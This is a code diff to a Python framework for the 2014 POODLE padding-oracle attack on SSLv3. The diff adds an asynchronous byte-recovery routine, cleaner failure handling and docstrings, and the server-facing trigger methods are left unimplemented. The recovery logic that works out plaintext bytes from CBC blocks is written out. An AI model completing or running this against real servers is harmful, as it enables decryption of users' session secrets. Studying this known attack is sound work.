@@ -1,6 +1,8 @@
-import binascii
-
 class POODLE(object):
+    """
+    Framework for 2014 POODLE SSLv3 attack.
+    See: https://www.imperialviolet.org/2014/10/14/poodle.html
+    """
     PHASE_BOUNDS_CHECK = 0
     PHASE_EXPLOIT = 1
 
@@ -14,7 +16,10 @@ class POODLE(object):
         self.message = None
         self.plaintext = []
         self.target_block = None
-        return
+
+        # Performance booster for find_byte() -call
+        self.async = True
+        self.async = False
 
     def mark_error(self):
         self.was_error = True
@@ -25,12 +30,12 @@ class POODLE(object):
         return
 
     def run(self):
-        self.detect_block_info()
-        print("Found block edge: %u, block size: %d bytes, recovery length: %d bytes, going for exploit!" %
-              (self.block_edge, self.block_size, self.recovery_length))
-        self.phase = POODLE.PHASE_EXPLOIT
-        if self.exploit():
-            return self.plaintext
+        if self.detect_block_info():
+            print("Found block edge: %u, block size: %d bytes, recovery length: %d bytes, going for exploit!" %
+                  (self.block_edge, self.block_size, self.recovery_length))
+            if self.exploit():
+                return self.plaintext
+
         return
 
     def exploit(self):
@@ -49,10 +54,16 @@ class POODLE(object):
             raise RuntimeError('Cannot work on block 0')
         self.target_block = block
 
+        if self.async:
+            return self._find_byte_async(block, byte)
+        else:
+            return self._find_byte(block, byte)
+
+    def _find_byte(self, block, byte):
         prefix_length = self.block_size + byte
         suffix_length = self.block_size - byte
 
-        attempts_to_make = 1500     # The theory is, that after 256 attempts, the byte is known
+        attempts_to_make = 1500     # The theory is, that after 256 attempts, the byte is known. In practice, no.
         for tries in range(attempts_to_make):
             self.was_error = False
             self.was_success = False
@@ -74,6 +85,26 @@ class POODLE(object):
 
         return None
 
+    def _find_byte_async(self, block, byte):
+        prefix_length = self.block_size + byte
+        suffix_length = self.block_size - byte
+
+        attempts_to_make = 1500     # The theory is, that after 256 attempts, the byte is known. In practice, no.
+        tries = self.trigger_find_byte(attempts_to_make, 'A' * (self.block_edge + prefix_length), 'A' * suffix_length)
+        if tries is not None:
+            char1 = self.block(block - 1)[-1]
+            char2 = self.block(-2)[-1]
+
+            plain_value = char1 ^ char2 ^ (self.block_size - 1)
+            plain = chr(plain_value)
+            print('Found block %u byte %u after %u tries: 0x%02x "%c"' % (block, byte, tries + 1, plain_value, plain))
+
+            return plain
+
+        print("Giving up after %d attempts." % attempts_to_make)
+
+        return None
+
     def message_callback(self, msg):
         self.message = msg
         if self.phase != POODLE.PHASE_EXPLOIT:
@@ -90,10 +121,11 @@ class POODLE(object):
         return self.message[n * self.block_size:(n + 1) * self.block_size]
 
     def detect_block_info(self):
+        self.phase = POODLE.PHASE_BOUNDS_CHECK
         msg = self.trigger('')
         if not msg:
             print("detect_block_info() Failed! Didn't receive initial message. Exit.")
-            exit(1)
+            return False
         reference = len(msg)
         self.recovery_length = len(self.message)
 
@@ -101,13 +133,39 @@ class POODLE(object):
             msg = self.trigger('A' * i)
             if not msg:
                 print("detect_block_info() Failed! Didn't receive a message. Exit.")
-                exit(1)
+                return False
             self.block_size = len(msg) - reference
             if self.block_size != 0:
                 self.block_edge = i
                 break
 
-        return
+        self.phase = POODLE.PHASE_EXPLOIT
+
+        return True
 
     def trigger(self, prefix, suffix=''):
+        """
+        This is a base class. It doesn't have the implementation to talk to servers.
+
+        trigger() -call will send a single request to attempt recover a byte.
+        In all likelihood, a single call will fail. If it does not, thanks to CBC, a single byte
+        can be recovered from the data.
+        :param prefix: Bytes to prefix the secret data with
+        :param suffix: Bytes to suffix the secret data with
+        :return: nothing of relevance
+        """
         raise NotImplementedError("Yes. Implement trigger()")
+
+    def trigger_find_byte(self, attempts, prefix, suffix=''):
+        """
+        This is a base class. It doesn't have the implementation to talk to servers.
+
+        trigger_find_byte() -call will send a burst of parallel requests to attempt recover a byte.
+        In all likelihood, one of the requests will succeed and thanks to CBC, a single byte
+        can be recovered from the data.
+        :param attempts: Number of attempts before giving up
+        :param prefix: Bytes to prefix the secret data with
+        :param suffix: Bytes to suffix the secret data with
+        :return: None, or the plaintext byte recovered
+        """
+        raise NotImplementedError("Yes. Implement trigger_find_byte()")
